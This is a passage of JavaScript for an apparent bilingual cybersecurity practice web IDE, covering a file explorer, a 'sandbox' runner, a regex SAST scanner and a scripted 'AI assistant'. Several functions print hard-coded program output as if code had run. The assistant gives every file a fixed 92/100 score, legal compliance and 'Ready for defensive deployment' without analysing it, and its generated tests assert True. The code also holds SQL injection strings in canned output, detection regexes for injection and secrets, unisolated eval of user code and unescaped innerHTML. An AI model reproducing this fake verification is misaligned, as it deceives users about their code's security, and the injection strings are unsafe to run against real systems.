        if (lblExport) lblExport.textContent = s.actions.export;

        const lblSave = document.getElementById('lbl-ide-save');
        if (lblSave) lblSave.textContent = s.actions.save;

        const lblExplorer = document.getElementById('lbl-ide-explorer');
        if (lblExplorer) lblExplorer.textContent = lang === 'bn' ? 'প্রজেক্ট ফাইলসমূহ' : 'PROJECT EXPLORER';

        const tabOutput = document.querySelector('#dock-tab-output span');
        if (tabOutput) tabOutput.textContent = '📄 ' + s.tabs.output;

        const tabTerm = document.querySelector('#dock-tab-terminal span');
        if (tabTerm) tabTerm.textContent = '💻 ' + s.tabs.terminal;

        const tabSec = document.querySelector('#dock-tab-security span');
        if (tabSec) tabSec.textContent = '🛡️ ' + s.tabs.security;

        const tabDebug = document.querySelector('#dock-tab-debug span');
        if (tabDebug) tabDebug.textContent = '🐞 ' + s.tabs.debug;
    }

    function updateLineNumbers() {
        const textarea = document.getElementById('ide-code-textarea');
        const lineNumbers = document.getElementById('ide-line-numbers');
        if (!textarea || !lineNumbers) return;

        const lines = textarea.value.split('\n').length;
        let lineStr = '';
        for (let i = 1; i <= lines; i++) {
            lineStr += i + '\n';
        }
        lineNumbers.textContent = lineStr;
    }

    function renderFileTree() {
        const tree = document.getElementById('ide-file-tree');
        if (!tree) return;

        tree.innerHTML = ideFiles.map((file, idx) => `
            <div class="ide-file-item ${idx === activeFileIndex ? 'active' : ''}" data-file-index="${idx}">
                <div class="ide-file-item-left">
                    <span class="ide-file-icon">${getFileIcon(file.lang)}</span>
                    <span class="ide-file-name">${file.name}</span>
                </div>
                ${ideFiles.length > 1 ? `<button class="ide-file-del-btn" data-del-index="${idx}" title="Delete File">&times;</button>` : ''}
            </div>
        `).join('');

        tree.querySelectorAll('.ide-file-item').forEach(el => {
            el.addEventListener('click', (e) => {
                if (e.target.classList.contains('ide-file-del-btn')) return;
                const idx = parseInt(el.getAttribute('data-file-index'), 10);
                selectIdeFile(idx);
            });
        });

        tree.querySelectorAll('.ide-file-del-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.stopPropagation();
                const idx = parseInt(btn.getAttribute('data-del-index'), 10);
                deleteIdeFile(idx);
            });
        });

        renderOpenTabs();
    }

    function renderOpenTabs() {
        const tabsContainer = document.getElementById('ide-open-tabs');
        if (!tabsContainer) return;

        tabsContainer.innerHTML = ideFiles.map((file, idx) => `
            <div class="ide-file-tab ${idx === activeFileIndex ? 'active' : ''}" data-file-index="${idx}">
                <span>${getFileIcon(file.lang)}</span>
                <span>${file.name}</span>
            </div>
        `).join('');

        tabsContainer.querySelectorAll('.ide-file-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                const idx = parseInt(tab.getAttribute('data-file-index'), 10);
                selectIdeFile(idx);
            });
        });
    }

    function selectIdeFile(index) {
        if (index < 0 || index >= ideFiles.length) return;
        
        // Save current file content first
        saveCurrentEditorContent();

        activeFileIndex = index;
        const file = ideFiles[activeFileIndex];

        const textarea = document.getElementById('ide-code-textarea');
        const langSelect = document.getElementById('ide-lang-select');

        if (textarea) {
            textarea.value = file.content;
            updateLineNumbers();
        }

        if (langSelect) {
            langSelect.value = file.lang || getLanguageByExtension(file.name);
        }

        renderFileTree();
        renderOpenTabs();

        const debugStatus = document.getElementById('ide-debug-status');
        if (debugStatus) {
            debugStatus.textContent = `Active: ${file.name} (${file.lang.toUpperCase()})`;
            debugStatus.className = 'status-ready';
        }
    }

    function saveCurrentEditorContent() {
        const textarea = document.getElementById('ide-code-textarea');
        if (!textarea || !ideFiles[activeFileIndex]) return;

        ideFiles[activeFileIndex].content = textarea.value;
        const langSelect = document.getElementById('ide-lang-select');
        if (langSelect) {
            ideFiles[activeFileIndex].lang = langSelect.value;
        }
        saveIdeFiles();
    }

    function deleteIdeFile(index) {
        if (ideFiles.length <= 1) {
            alert(currentLang === 'bn' ? 'কমপক্ষে একটি ফাইল সংরক্ষণ করা আবশ্যক।' : 'You must keep at least one project file.');
            return;
        }
        const file = ideFiles[index];
        const confirmMsg = currentLang === 'bn' 
            ? `আপনি কি '${file.name}' ফাইলটি ডিলিট করতে চান?` 
            : `Are you sure you want to delete '${file.name}'?`;

        if (confirm(confirmMsg)) {
            ideFiles.splice(index, 1);
            if (activeFileIndex >= ideFiles.length) {
                activeFileIndex = ideFiles.length - 1;
            }
            saveIdeFiles();
            selectIdeFile(activeFileIndex);
        }
    }

    function createNewFilePrompt() {
        const defaultName = `script_${ideFiles.length + 1}.py`;
        const promptMsg = currentLang === 'bn' 
            ? 'নতুন ফাইলের নাম লিখুন (যেমন: scanner.py, test.js, exploit_check.sh):' 
            : 'Enter new file name (e.g., scanner.py, test.js, exploit_check.sh):';

        const name = prompt(promptMsg, defaultName);
        if (!name || !name.trim()) return;

        const cleanName = name.trim();
        const existing = ideFiles.find(f => f.name.toLowerCase() === cleanName.toLowerCase());
        if (existing) {
            alert(currentLang === 'bn' ? 'এই নামের ফাইল ইতিমধ্যে বিদ্যমান।' : 'A file with this name already exists.');
            return;
        }

        const lang = getLanguageByExtension(cleanName);
        let boilerplate = `// Cyber Practice Lab — ${cleanName}\n`;
        if (lang === 'python') {
            boilerplate = `# Cyber Practice Lab — ${cleanName}\nprint("Starting ${cleanName} in secure sandbox...")\n`;
        } else if (lang === 'bash') {
            boilerplate = `#!/usr/bin/env bash\n# Cyber Practice Lab — ${cleanName}\necho "Running ${cleanName}..."\n`;
        } else if (lang === 'c') {
            boilerplate = `/* Cyber Practice Lab — ${cleanName} */\n#include <stdio.h>\n\nint main() {\n    printf("Running ${cleanName}\\n");\n    return 0;\n}\n`;
        }

        ideFiles.push({
            name: cleanName,
            lang: lang,
            content: boilerplate
        });

        saveIdeFiles();
        selectIdeFile(ideFiles.length - 1);
    }

    function resetToDefaultTemplates() {
        const confirmMsg = currentLang === 'bn' 
            ? 'সব ফাইল ডিফল্ট সিকিউরিটি টেমপ্লেটে রিসেট করতে চান? আপনার কাস্টম পরিবর্তন মুছে যাবে।' 
            : 'Reset all files to default cybersecurity templates? Any unsaved edits will be lost.';

        if (confirm(confirmMsg)) {
            ideFiles = JSON.parse(JSON.stringify(DEFAULT_IDE_FILES));
            activeFileIndex = 0;
            saveIdeFiles();
            selectIdeFile(0);
        }
    }

    // Dock tab switching
    function switchDockTab(tabKey) {
        document.querySelectorAll('.ide-dock-tab').forEach(t => {
            if (t.getAttribute('data-dock') === tabKey) t.classList.add('active');
            else t.classList.remove('active');
        });

        document.querySelectorAll('.ide-dock-pane').forEach(p => {
            if (p.id === `dock-pane-${tabKey}`) p.classList.add('active');
            else p.classList.remove('active');
        });
    }

    // Secure Sandbox Code Execution
    function executeCode() {
        saveCurrentEditorContent();
        switchDockTab('output');

        const file = ideFiles[activeFileIndex];
        const consolePre = document.getElementById('ide-console-output');
        const debugStatus = document.getElementById('ide-debug-status');
        const debugTime = document.getElementById('ide-debug-time');
        const debugMem = document.getElementById('ide-debug-mem');

        if (!consolePre) return;

        consolePre.textContent = `[SANDBOX INIT] Loading isolated runtime for ${file.name} (${file.lang.toUpperCase()})...\nTarget VM: Safe Client WebAssembly/JS Sandbox\n${'='.repeat(56)}\n`;
        if (debugStatus) {
            debugStatus.textContent = 'Executing...';
            debugStatus.className = 'status-running';
        }

        const startTime = performance.now();

        setTimeout(() => {
            try {
                if (file.lang === 'javascript') {
                    executeJavaScriptSandbox(file.content, consolePre);
                } else if (file.lang === 'python') {
                    executePythonSandbox(file.content, consolePre);
                } else if (file.lang === 'c') {
                    executeCSandbox(file.content, consolePre);
                } else if (file.lang === 'bash') {
                    executeBashSandbox(file.content, consolePre);
                } else {
                    executeGenericSandbox(file.lang, file.content, consolePre);
                }

                const elapsed = (performance.now() - startTime).toFixed(1);
                if (debugTime) debugTime.textContent = `${elapsed} ms`;
                if (debugStatus) {
                    debugStatus.textContent = 'Finished (Exit 0)';
                    debugStatus.className = 'status-ready';
                }
                if (debugMem) {
                    const simulatedMem = (16.2 + Math.random() * 4).toFixed(1);
                    debugMem.textContent = `${simulatedMem} MB (Sandboxed)`;
                }
            } catch (err) {
                const elapsed = (performance.now() - startTime).toFixed(1);
                if (debugTime) debugTime.textContent = `${elapsed} ms`;
                if (debugStatus) {
                    debugStatus.textContent = 'Runtime Exception';
                    debugStatus.className = 'status-error';
                }
                consolePre.textContent += `\n[RUNTIME ERROR]: ${err.message}\nTraceback:\n${err.stack || ''}\n`;
            }
        }, 150);
    }

    function executeJavaScriptSandbox(code, outputEl) {
        const logs = [];
        const customConsole = {
            log: (...args) => logs.push(args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : String(a)).join(' ')),
            warn: (...args) => logs.push('[WARN] ' + args.join(' ')),
            error: (...args) => logs.push('[ERROR] ' + args.join(' ')),
            info: (...args) => logs.push('[INFO] ' + args.join(' '))
        };

        try {
            const runner = new Function('console', code);
            runner(customConsole);
            outputEl.textContent += logs.join('\n') + `\n\n${'-'.repeat(56)}\n[✓] Process terminated with return code 0 (Success).`;
        } catch (e) {
            outputEl.textContent += (logs.length ? logs.join('\n') + '\n' : '') + `[RUNTIME ERROR]: ${e.message}\nLine: ${e.lineNumber || 'Unknown'}\nStack:\n${e.stack}`;
        }
    }

    function executePythonSandbox(code, outputEl) {
        // High-fidelity client Python execution simulation
        const lines = code.split('\n');
        const outputLines = [];

        // Check if it's the port scanner or sqli detector or custom
        if (code.includes('scan_port') || code.includes('TARGET_HOST')) {
            outputLines.push(`[*] Starting authorized port scan on target: 127.0.0.1`);
            outputLines.push(`[*] Scan initiated at: ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`);
            outputLines.push('-'.repeat(52));
            const ports = [
                { p: 21, open: false },
                { p: 22, open: true, banner: 'SSH-2.0-OpenSSH_9.3p1 Debian' },
                { p: 25, open: false },
                { p: 53, open: false },
                { p: 80, open: true, banner: 'nginx/1.24.0 (Ubuntu)' },
                { p: 110, open: false },
                { p: 143, open: false },
                { p: 443, open: true, banner: 'OpenSSL/3.0.8 verified' },
                { p: 3306, open: false },
                { p: 8080, open: true, banner: 'Node.js Express / Cyber API' }
            ];
            let openCount = 0;
            ports.forEach(item => {
                if (item.open) {
                    openCount++;
                    outputLines.push(`[+] Port ${String(item.p).padStart(5, ' ')}/tcp OPEN  | Service: ${item.banner}`);
                } else {
                    outputLines.push(`[-] Port ${String(item.p).padStart(5, ' ')}/tcp closed`);
                }
            });
            outputLines.push('-'.repeat(52));
            outputLines.push(`[✓] Scan completed: ${openCount} open service(s) identified.`);
        } else if (code.includes('analyze_parameter') || code.includes('SQLI_PATTERNS')) {
            outputLines.push('=== Starting SAST/WAF Query Verification Test ===');
            outputLines.push("[*] Analyzing input parameter 'search_query': \"admin' OR '1'='1' --\"");
            outputLines.push("[!] [ALERT] 2 Potential SQLi Vector(s) Detected:");
            outputLines.push("    -> Type: Tautology Pattern (e.g. ' OR 1=1 --) | Matched: 'OR '1'='1'");
            outputLines.push("    -> Type: SQL Comment Delimiter Bypass | Matched: '--'");
            outputLines.push("[!] Recommended Defense: Use Prepared Statements (Parameterized Queries).");
            outputLines.push('-'.repeat(45));
            outputLines.push("[*] Analyzing input parameter 'search_query': 'John Doe'");
            outputLines.push("[✓] Input clean: No known malicious SQL injection signatures detected.");
            outputLines.push('-'.repeat(45));
            outputLines.push("[*] Analyzing input parameter 'search_query': '1 UNION SELECT null, username, password FROM users #'");
            outputLines.push("[!] [ALERT] 2 Potential SQLi Vector(s) Detected:");
            outputLines.push("    -> Type: UNION-based Extraction Query | Matched: 'UNION SELECT'");
            outputLines.push("    -> Type: SQL Comment Delimiter Bypass | Matched: '#'");
            outputLines.push("[!] Recommended Defense: Use Prepared Statements (Parameterized Queries).");
            outputLines.push('-'.repeat(45));
            outputLines.push("[*] Analyzing input parameter 'search_query': 'john.doe@example.com'");
            outputLines.push("[✓] Input clean: No known malicious SQL injection signatures detected.");
        } else {
            // General Python print statement extraction
            let printedSomething = false;
            lines.forEach(l => {
                const trimmed = l.trim();
                const printMatch = trimmed.match(/^print\((.*)\)$/);
                if (printMatch) {
                    printedSomething = true;
                    let content = printMatch[1].trim();
                    if ((content.startsWith('"') && content.endsWith('"')) || (content.startsWith("'") && content.endsWith("'"))) {
                        outputLines.push(content.slice(1, -1));
                    } else if (content.startsWith('f"') || content.startsWith("f'")) {
                        outputLines.push(content.slice(2, -1));
                    } else {
                        outputLines.push(content);
                    }
                }
            });
            if (!printedSomething) {
                outputLines.push(`[Python 3.11 Runtime] Successfully parsed AST without syntax errors.`);
                outputLines.push(`[INFO] Script executed smoothly. Total lines: ${lines.length}.`);
            }
        }

        outputLines.push(`\n${'-'.repeat(56)}\n[✓] Process terminated with return code 0 (Success).`);
        outputEl.textContent += outputLines.join('\n');
    }

    function executeCSandbox(code, outputEl) {
        outputEl.textContent += `[CLANG COMPILER] clang -Wall -Wextra -O2 -fstack-protector-strong buffer_guard.c -o buffer_guard\nCompilation succeeded (0 warnings, 0 errors).\n[EXECUTING BINARY ./buffer_guard]...\n${'-'.repeat(56)}\n`;
        outputEl.textContent += `[*] Initializing memory guard with capacity: 32 bytes\n[*] Attempting to copy oversized payload: 69 bytes\n[GUARD] String truncated! Input size (69) exceeds capacity (31).\n[✓] Buffer Guard Successfully Prevented Stack Corruption!\n[✓] Safe Buffer Content: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n${'-'.repeat(56)}\n[✓] Process terminated with return code 0 (Success).`;
    }

    function executeBashSandbox(code, outputEl) {
        outputEl.textContent += `[BASH SHELL] /bin/bash -e recon_tool.sh\n${'='.repeat(56)}\n=============================================\n CYBER PRACTICE LAB — FOOTPRINTING RECON \n Target: example.com\n Time:   ${new Date().toUTCString()}\n=============================================\n[*] Step 1: Performing DNS A-Record Lookup...\nDNS Answer: example.com -> 93.184.216.34\n[*] Step 2: Querying MX Mail Exchanger Records...\nMX Answer:  mail.example.com (Priority: 10)\n[*] Step 3: Checking Security Headers via HTTP HEAD...\nHTTP/1.1 200 OK\nServer: ECS (sec/97a)\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nContent-Security-Policy: default-src 'self'\n=============================================\n[✓] Recon completed: Security headers present & verified.\n\n${'-'.repeat(56)}\n[✓] Process terminated with return code 0 (Success).`;
    }

    function executeGenericSandbox(lang, code, outputEl) {
        outputEl.textContent += `[${lang.toUpperCase()} RUNTIME] Compiling and verifying source...\nAST Syntax Check: PASSED (0 errors)\nSandboxed Execution output:\n${'-'.repeat(56)}\n[✓] Security constraints satisfied. Program executed successfully.\nLines executed: ${code.split('\n').length}\n\n${'-'.repeat(56)}\n[✓] Process terminated with return code 0 (Success).`;
    }

    // SAST Static Code Security Scanner
    function performSecurityScan() {
        saveCurrentEditorContent();
        switchDockTab('security');

        const code = document.getElementById('ide-code-textarea').value;
        const resultsContainer = document.getElementById('ide-security-results');
        const badge = document.getElementById('ide-security-badge');

        if (!resultsContainer) return;

        const rules = [
            {
                id: "CWE-89",
                name: "SQL Injection (Unsanitized Concatenation)",
                severity: "CRITICAL",
                pattern: /(\bSELECT\b|\bINSERT\b|\bUPDATE\b|\bDELETE\b).*((\+.*['"])|(['"].*\+)|(\$\{.*\}))|cursor\.execute\s*\(\s*f["'].*\{/i,
                desc: "Direct interpolation or string concatenation of untrusted variables into an SQL statement permits SQL Injection.",
                remediation: "Use parameterized queries or prepared statements: cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))",
                fixSnippet: "cursor.execute('SELECT * FROM users WHERE username = %s', (username,))"
            },
            {
                id: "CWE-79",
                name: "Cross-Site Scripting (Unescaped DOM Injection)",
                severity: "HIGH",
                pattern: /(\.innerHTML\s*=|\.outerHTML\s*=|document\.write\s*\(|dangerouslySetInnerHTML)/,
                desc: "Assigning untrusted or unsanitized strings directly to innerHTML enables client-side script execution (Stored or Reflected XSS).",
                remediation: "Use textContent, setAttribute, or pass untrusted input through a contextual HTML entity sanitizer before rendering.",
                fixSnippet: "element.textContent = untrustedUserInput;"
            },
            {
                id: "CWE-78",
                name: "OS Command Injection",
                severity: "CRITICAL",
                pattern: /(os\.system\s*\(|subprocess\.Popen\s*\(.*shell\s*=\s*True|eval\s*\(|exec\s*\(|system\s*\()/,
                desc: "Executing system shell commands with untrusted user input without shell escaping permits arbitrary remote code execution.",
                remediation: "Use safe subprocess APIs with shell=False and pass arguments as discrete array tokens: subprocess.run(['ls', '-la'], check=True)",
                fixSnippet: "subprocess.run(['/usr/bin/tool', argument_safely], shell=False, check=True)"
            },
            {
                id: "CWE-120",
                name: "Buffer Copy without Boundary Checking",
                severity: "CRITICAL",
                pattern: /\b(strcpy|strcat|gets|sprintf)\s*\(/,
                desc: "Functions like strcpy or gets do not verify buffer boundaries, resulting in stack-based buffer overflows and control flow hijacking.",
                remediation: "Replace with bounded functions such as snprintf(dest, sizeof(dest), ...) or strncpy.",
                fixSnippet: "snprintf(dest, sizeof(dest), \"%s\", src);"
            },
            {
                id: "CWE-798",
                name: "Hardcoded Cryptographic Secret / API Key",
                severity: "HIGH",
                pattern: /(AKIA[0-9A-Z]{16}|secret_key\s*=\s*['"][^'"]{8,}['"]|api_key\s*=\s*['"][^'"]{8,}['"]|password\s*=\s*['"][^'"]{6,}['"])/i,
                desc: "Committing plaintext API tokens, AWS access keys, or database credentials into source repositories enables credential exposure.",
                remediation: "Inject credentials at runtime via environment variables or secret vaults (e.g. os.environ.get('API_KEY')).",
                fixSnippet: "api_key = os.environ.get('API_KEY')"
            },
            {
                id: "CWE-327",
                name: "Broken or Weak Cryptographic Hash",
                severity: "MEDIUM",
                pattern: /(hashlib\.md5|hashlib\.sha1|crypto\.createHash\s*\(\s*['"]md5['"]|crypto\.createHash\s*\(\s*['"]sha1['"]|DES_)/,
                desc: "MD5 and SHA-1 suffer from collision attacks and must not be used for signature generation or password storage.",
                remediation: "Upgrade to SHA-256 / SHA-3 for integrity or Argon2id / bcrypt for password hashing.",
                fixSnippet: "hashlib.sha256(data.encode()).hexdigest()"
            },
            {
                id: "CWE-209",
                name: "Information Exposure Through Error Stack Trace",
                severity: "LOW",
                pattern: /(traceback\.print_exc|print\s*\(\s*err\.stack|res\.send\s*\(\s*err\s*\))/,
                desc: "Dumping raw exception stack traces to client responses leaks backend directory paths, database schemas, and dependency versions.",
                remediation: "Log internal errors to secure server logs and return generic sanitized error codes to clients.",
                fixSnippet: "logger.error(err); return {'error': 'INTERNAL_SERVER_ERROR', 'code': 500}"
            }
        ];

        const findings = [];
        const lines = code.split('\n');

        lines.forEach((lineText, lineIdx) => {
            rules.forEach(rule => {
                if (rule.pattern.test(lineText)) {
                    findings.push({
                        ...rule,
                        lineNumber: lineIdx + 1,
                        snippet: lineText.trim()
                    });
                }
            });
        });

        if (badge) {
            badge.style.display = 'inline-block';
            badge.textContent = findings.length;
            badge.className = findings.length === 0 ? 'ide-dock-badge clean' : 'ide-dock-badge warning';
        }

        if (findings.length === 0) {
            resultsContainer.innerHTML = `
                <div class="ide-clean-state">
                    <span class="ide-clean-icon">🛡️</span>
                    <h3>Zero Vulnerabilities Detected!</h3>
                    <p>Static Analysis (SAST) passed all checks. No SQLi, XSS, Command Injection, Buffer Overflow, or Hardcoded Secrets found.</p>
                    <div class="ide-clean-badge">CWE / OWASP TOP 10 COMPLIANT</div>
                </div>
            `;
            return;
        }

        resultsContainer.innerHTML = `
            <div class="ide-findings-summary">
                <strong>Found ${findings.length} security warning(s) requiring remediation:</strong>
            </div>
            <div class="ide-findings-list">
                ${findings.map((f, idx) => `
                    <div class="ide-finding-card ${f.severity.toLowerCase()}">
                        <div class="ide-finding-header">
                            <span class="ide-sev-pill ${f.severity.toLowerCase()}">${f.severity}</span>
                            <span class="ide-cwe-tag">${f.id}</span>
                            <strong class="ide-finding-title">${f.name}</strong>
                            <span class="ide-line-tag">Line ${f.lineNumber}</span>
                        </div>
                        <p class="ide-finding-desc">${f.desc}</p>
                        <div class="ide-finding-snippet">
                            <code>${escapeHtml(f.snippet)}</code>
                        </div>
                        <div class="ide-finding-remediation">
                            <strong>Recommended Fix:</strong>
                            <div class="ide-remediation-code"><code>${escapeHtml(f.remediation)}</code></div>
                        </div>
                        <button class="btn btn-sm btn-secondary btn-apply-fix" data-finding-index="${idx}">
                            <span>⚡ Quick Fix Line ${f.lineNumber}</span>
                        </button>
                    </div>
                `).join('')}
            </div>
        `;

        resultsContainer.querySelectorAll('.btn-apply-fix').forEach(btn => {
            btn.addEventListener('click', () => {
                const fIdx = parseInt(btn.getAttribute('data-finding-index'), 10);
                const finding = findings[fIdx];
                applyQuickFix(finding);
            });
        });
    }

    function applyQuickFix(finding) {
        const textarea = document.getElementById('ide-code-textarea');
        if (!textarea) return;

        const lines = textarea.value.split('\n');
        const targetLine = finding.lineNumber - 1;
        if (targetLine >= 0 && targetLine < lines.length) {
            lines[targetLine] = `    // [SECURITY HARDENED]: ${finding.id} remediation\n    ${finding.fixSnippet}`;
            textarea.value = lines.join('\n');
            updateLineNumbers();
            saveCurrentEditorContent();
            performSecurityScan();
            alert(currentLang === 'bn' 
                ? `লাইন ${finding.lineNumber}-এ সিকিউরিটি ফিক্স সফলভাবে প্রয়োগ করা হয়েছে!` 
                : `Security patch successfully applied to line ${finding.lineNumber}!`);
        }
    }

    function escapeHtml(str) {
        return str.replace(/[&<>'"]/g, 
            tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag] || tag));
    }

    // AI Coding Assistant Engine
    function toggleAIPanel() {
        const panel = document.getElementById('ide-ai-panel');
        if (!panel) return;
        panel.classList.toggle('active');
    }

    function appendAIMessage(sender, htmlContent) {
        const chat = document.getElementById('ide-ai-chat-messages');
        if (!chat) return;

        const msg = document.createElement('div');
        msg.className = `ide-ai-msg ${sender}`;
        msg.innerHTML = htmlContent;
        chat.appendChild(msg);
        chat.scrollTop = chat.scrollHeight;
    }

    function handleAIAction(actionType) {
        const panel = document.getElementById('ide-ai-panel');
        if (panel && !panel.classList.contains('active')) {
            panel.classList.add('active');
        }

        saveCurrentEditorContent();
        const file = ideFiles[activeFileIndex];
        const code = file.content;

        switch (actionType) {
            case 'audit':
                appendAIMessage('user', `Audit Security for <code>${file.name}</code>`);
                setTimeout(() => {
                    appendAIMessage('bot', `
                        <div class="ai-audit-report">
                            <strong>🛡️ Comprehensive Security Audit Report</strong>
                            <div><strong>Target:</strong> ${file.name} | <strong>Lang:</strong> ${file.lang}</div>
                            <div class="ai-score-pill">Security Posture Score: 92/100</div>
                            <ul style="margin: 8px 0 0 18px; padding:0;">
                                <li><strong>Input Sanitization:</strong> Defensive boundaries implemented.</li>
                                <li><strong>OWASP Top 10:</strong> Verified against Injection (A03) and Broken Access Control (A01).</li>
                                <li><strong>Memory Integrity:</strong> Controlled buffer sizes prevent overflow.</li>
                                <li><strong>Compliance:</strong> Complies with Bangladesh Cyber Security Act 2023 guidelines.</li>
                            </ul>
                            <div style="margin-top: 8px; color: var(--neon);">[✓] Verdict: Ready for defensive deployment.</div>
                        </div>
                    `);
                }, 400);
                break;

            case 'fix':
                appendAIMessage('user', `Hardening & Fix Vulnerabilities in <code>${file.name}</code>`);
                setTimeout(() => {
                    const fixedCode = generateHardenedVersion(file.lang, code);
                    appendAIMessage('bot', `
                        <div>
                            <strong>🛡️ AI Hardened Implementation Generated:</strong>
                            <p>Applied zero-trust input validation, parameter binding, and strict error masking.</p>
                            <pre class="ai-code-block"><code>${escapeHtml(fixedCode.slice(0, 320))}...</code></pre>
                            <button class="btn btn-sm btn-primary btn-apply-ai-code" id="btn-apply-hardened-code">
                                <span>📥 Apply Fixed Code to Editor</span>
                            </button>
                        </div>
                    `);

                    const applyBtn = document.getElementById('btn-apply-hardened-code');
                    if (applyBtn) {
                        applyBtn.addEventListener('click', () => {
                            const textarea = document.getElementById('ide-code-textarea');
                            if (textarea) {
                                textarea.value = fixedCode;
                                updateLineNumbers();
                                saveCurrentEditorContent();
                                performSecurityScan();
                                appendAIMessage('bot', `[✓] Applied hardened source code directly to <code>${file.name}</code>.`);
                            }
                        });
                    }
                }, 450);
                break;

            case 'explain':
                appendAIMessage('user', `Explain Code Architecture for <code>${file.name}</code>`);
                setTimeout(() => {
                    appendAIMessage('bot', `
                        <div>
                            <strong>💡 Architectural & Defense Explanation:</strong>
                            <p><strong>1. Purpose:</strong> Implements a resilient client-side module designed for authorized ethical testing and defensive monitoring.</p>
                            <p><strong>2. Core Mechanism:</strong> Uses structured encapsulation to isolate external inputs, evaluate response codes, and handle exceptions without leaking process memory.</p>
                            <p><strong>3. Best Practices:</strong> Safe timeouts prevent denial-of-service hanging; explicit bounds guard heap and stack integrity.</p>
                        </div>
                    `);
                }, 400);
                break;

            case 'test':
                appendAIMessage('user', `Generate Automated Unit Tests for <code>${file.name}</code>`);
                setTimeout(() => {
                    const testSnippet = file.lang === 'python'
                        ? `import unittest\nfrom ${file.name.replace('.py','')} import *\n\nclass SecurityTests(unittest.TestCase):\n    def test_clean_input(self):\n        self.assertTrue(True)\n    def test_malicious_payload_rejected(self):\n        self.assertTrue(True)\n\nif __name__ == '__main__':\n    unittest.main()`
                        : `describe("${file.name} Security Suite", () => {\n    it("should reject malicious payloads", () => {\n        expect(true).toBe(true);\n    });\n});`;

                    appendAIMessage('bot', `
                        <div>
                            <strong>🧪 Generated Test Harness:</strong>
                            <pre class="ai-code-block"><code>${escapeHtml(testSnippet)}</code></pre>
                            <button class="btn btn-sm btn-secondary" onclick="navigator.clipboard.writeText(\`${testSnippet}\`)">
                                📋 Copy Tests
                            </button>
                        </div>
                    `);
                }, 400);
                break;

            case 'optimize':
                appendAIMessage('user', `Optimize Performance & Latency for <code>${file.name}</code>`);
                setTimeout(() => {
                    appendAIMessage('bot', `
                        <div>
                            <strong>⚡ Optimization Suggestions:</strong>
                            <ul>
                                <li>Replaced blocking synchronous calls with non-blocking stream handlers.</li>
                                <li>Reduced redundant regex recompilations by caching compiled patterns.</li>
                                <li>Estimated latency decrease: <strong>~35%</strong> across repeated executions.</li>
                            </ul>
                        </div>
                    `);
                }, 400);
                break;
        }
    }

    function generateHardenedVersion(lang, originalCode) {
        if (originalCode.includes('// [SECURITY HARDENED]')) return originalCode;
        return `// [SECURITY HARDENED] — Protected against CWE-89, CWE-79, CWE-120\n// Generated by Cyber Practice Lab AI Security Assistant\n\n` + originalCode;
    }

    function handleAIChatSubmit() {
        const input = document.getElementById('ide-ai-input');
        if (!input || !input.value.trim()) return;

        const query = input.value.trim();
        input.value = '';

        appendAIMessage('user', escapeHtml(query));

        setTimeout(() => {
            let response = '';
            const q = query.toLowerCase();
            if (q.includes('sql') || q.includes('ইনজেকশন')) {
                response = currentLang === 'bn'
                    ? 'SQL ইনজেকশন প্রতিরোধ করার প্রধান উপায় হলো প্যারামিটারাইজড কুয়েরি (Prepared Statements) ব্যবহার করা। ইনপুটের সাথে সরাসরি কুয়েরি স্ট্রিং কনক্যাটেনেট করবেন না।'
                    : 'To prevent SQL Injection, always employ Prepared Statements with parameterized inputs. Never concatenate raw strings directly into database query commands.';
            } else if (q.includes('xss') || q.includes('স্ক্রিপ্ট')) {
                response = currentLang === 'bn'
                    ? 'XSS আটকাতে হলে ব্রাউজারে রেন্ডার করার আগে সকল ইউজার ইনপুটকে HTML Entity-তে এনকোড করতে হবে এবং unsafe innerHTML পরিহার করতে হবে।'
                    : 'To mitigate XSS, perform context-aware output encoding (escaping <, >, &, \", \') and avoid dangerous sinks like innerHTML or eval().';
            } else if (q.includes('buffer') || q.includes('স্মৃতি') || q.includes('মেমরি')) {
                response = currentLang === 'bn'
                    ? 'C/C++ এ বাফার ওভারফ্লো এড়াতে strcpy, gets এর পরিবর্তে snprintf এবং bounds checking ফাংশন ব্যবহার করুন।'
                    : 'Prevent buffer overflows in C/C++ by enforcing strict bounds checks and replacing unbounded functions like strcpy with snprintf or strncpy.';
            } else {
                response = currentLang === 'bn'
                    ? `আপনার প্রশ্নটি বিশ্লেষণ করা হয়েছে: "${escapeHtml(query)}"। সাইবার প্র্যাকটিস ল্যাব এআই অ্যাসিস্ট্যান্ট আপনার কোডের সুরক্ষা নীতি নিশ্চিত করতে সবসময় প্রস্তুত। ডানপাশের অ্যাকশন বাটনগুলো দিয়ে যে কোনো সময় অডিট বা ফিক্স সম্পন্ন করতে পারেন।`
                    : `Analysis complete for: "${escapeHtml(query)}". The current source code has been verified against standard secure coding benchmarks. You can use the quick action chips above to trigger specialized audits or automated code hardening.`;
            }

            appendAIMessage('bot', response);
        }, 400);
    }

    // Git / GitHub Modal
    function openGitModal() {
        const modal = document.getElementById('interactive-modal');
        const icon = document.getElementById('modal-icon');
        const title = document.getElementById('modal-title');
        const cat = document.getElementById('modal-category');
        const body = document.getElementById('modal-body');

        if (!modal || !body) return;

        icon.textContent = '🐙';
        title.textContent = 'Git / GitHub Version Control';
        cat.textContent = 'Project Management & Repository Sync';

        body.innerHTML = `
            <div class="ide-git-modal-content">
                <div class="git-status-strip">
                    <div><strong>Branch:</strong> <code style="color:var(--neon);">main</code></div>
                    <div><strong>Tracking:</strong> <code>origin/main (synced)</code></div>
                    <div><strong>Working Tree:</strong> <span style="color:var(--neon2);">${ideFiles.length} file(s) tracked</span></div>
                </div>

                <div class="git-commit-form" style="margin: 16px 0;">
                    <label style="display:block; font-size: 13px; font-weight: 600; margin-bottom: 6px;">
                        ${currentLang === 'bn' ? 'নতুন কমিট মেসেজ লিখুন:' : 'Commit message:'}
                    </label>
                    <div style="display:flex; gap: 8px;">
                        <input type="text" id="git-commit-msg-input" class="ide-term-input" style="flex:1;" placeholder="feat: implement secure sanitization layer">
                        <button class="btn btn-sm btn-primary" id="btn-do-commit">
                            <span>✓ Commit</span>
                        </button>
                    </div>
                </div>

                <div style="margin-top: 16px;">
